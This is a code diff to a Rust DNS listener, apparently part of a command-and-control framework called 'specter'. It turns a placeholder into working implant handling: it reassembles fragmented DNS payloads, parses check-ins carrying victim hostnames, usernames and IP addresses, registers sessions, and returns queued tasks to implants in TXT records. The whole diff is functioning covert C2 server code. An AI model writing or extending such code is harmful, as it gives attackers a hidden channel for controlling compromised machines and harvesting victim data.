@@ -515,9 +515,113 @@ pub async fn process_dns_query(query: &[u8], state: &DnsListenerState) -> Option
                 data.data.len()
             );
 
-            // TODO: Process implant data through session_manager/task_dispatcher
-            // For now, respond with empty TXT (acknowledgement)
-            let response_data = base32_encode(b"ok");
+            // Reassemble fragmented DNS payloads before processing
+            let mut reassembly = state.reassembly.lock().await;
+            let buffer = reassembly
+                .entry(data.session_id.clone())
+                .or_insert_with(ReassemblyBuffer::new);
+
+            let reassembled = buffer.insert(data.sequence, data.data.clone());
+
+            // If we have a complete payload, route it through session management
+            let response_data = if let Some(payload) = reassembled {
+                tracing::info!(
+                    "DNS C2: reassembled payload for session={}, len={}",
+                    data.session_id,
+                    payload.len()
+                );
+                // Clear the reassembly buffer for this session
+                if let Some(buf) = reassembly.get_mut(&data.session_id) {
+                    buf.clear();
+                }
+                drop(reassembly);
+
+                // Attempt to parse the reassembled payload as a binary checkin
+                // (same format the HTTP beacon_handler expects after decryption).
+                match specter_common::checkin::parse_binary_checkin(&payload) {
+                    Some(checkin_req) => {
+                        tracing::info!(
+                            "DNS C2: parsed checkin from session={}, host={}, user={}",
+                            data.session_id,
+                            checkin_req.hostname,
+                            checkin_req.username,
+                        );
+
+                        // Register or update the session
+                        let session_id = state
+                            .session_manager
+                            .register_or_update(
+                                &checkin_req.hostname,
+                                &checkin_req.username,
+                                checkin_req.pid,
+                                &checkin_req.os_version,
+                                &checkin_req.integrity_level,
+                                &checkin_req.process_name,
+                                &checkin_req.internal_ip,
+                                &checkin_req.external_ip,
+                            )
+                            .await;
+
+                        match session_id {
+                            Ok(sid) => {
+                                // Process task results from the implant
+                                for tr in &checkin_req.task_results {
+                                    let success = tr.status == "COMPLETE";
+                                    let _ = state
+                                        .task_dispatcher
+                                        .complete_task(&tr.task_id, tr.result.as_bytes(), success)
+                                        .await;
+                                }
+
+                                // Fetch pending tasks for the response
+                                let pending = state
+                                    .task_dispatcher
+                                    .get_pending_tasks(&sid)
+                                    .await
+                                    .unwrap_or_default();
+
+                                for t in &pending {
+                                    let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
+                                }
+
+                                let resp = specter_common::checkin::CheckinResponse {
+                                    session_id: sid,
+                                    tasks: pending
+                                        .iter()
+                                        .map(|t| specter_common::checkin::PendingTaskPayload {
+                                            task_id: t.id.clone(),
+                                            task_type: t.task_type.clone(),
+                                            arguments: t.arguments.clone(),
+                                        })
+                                        .collect(),
+                                };
+
+                                let resp_bytes =
+                                    specter_common::checkin::serialize_binary_response(&resp);
+                                base32_encode(&resp_bytes)
+                            }
+                            Err(e) => {
+                                tracing::error!("DNS C2: session registration failed: {e}");
+                                base32_encode(b"err")
+                            }
+                        }
+                    }
+                    None => {
+                        tracing::warn!(
+                            "DNS C2: failed to parse reassembled payload as binary checkin \
+                             (session={}, len={}); data may require decryption or use a \
+                             different format",
+                            data.session_id,
+                            payload.len()
+                        );
+                        base32_encode(b"err")
+                    }
+                }
+            } else {
+                // Fragment received but not yet complete — acknowledge
+                drop(reassembly);
+                base32_encode(b"ack")
+            };
 
             match question.qtype {
                 DNS_TYPE_TXT => Some(build_txt_response(
